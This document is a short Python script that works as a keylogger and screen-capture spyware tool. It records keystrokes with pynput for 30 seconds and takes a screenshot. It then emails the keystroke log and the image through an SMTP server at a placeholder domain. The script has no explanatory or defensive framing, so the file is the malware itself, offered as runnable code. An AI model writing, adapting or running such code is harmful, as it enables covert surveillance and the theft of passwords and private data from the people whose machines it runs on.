import smtplib
import tempfile
from pathlib import Path
from email.message import EmailMessage
from pynput.keyboard import Listener
from PIL import ImageGrab

class Recorder:
    def __init__(self, target):
        self.target = target

    def receive(self, event):
        value = event.char
        self.save(value)

    def save(self, value):
        with open(self.target, 'a', encoding='utf-8') as output:
            output.write(value)


def collect_and_send():
    stage = Path(tempfile.gettempdir())
    log = stage / 'input.txt'
    recorder = Recorder(log)
    listener = Listener(on_press=recorder.receive)
    listener.start()
    listener.join(30)
    listener.stop()
    image = stage / 'screenshot.png'
    ImageGrab.grab().save(image)
    message = EmailMessage()
    message['From'] = 'sender@example.invalid'
    message['To'] = 'receiver@example.invalid'
    message.set_content(log.read_text())
    message.add_attachment(image.read_bytes(), maintype='image', subtype='png', filename=image.name)
    with smtplib.SMTP('mail.example.invalid', 587) as server:
        server.send_message(message)

if __name__ == '__main__':
    collect_and_send()
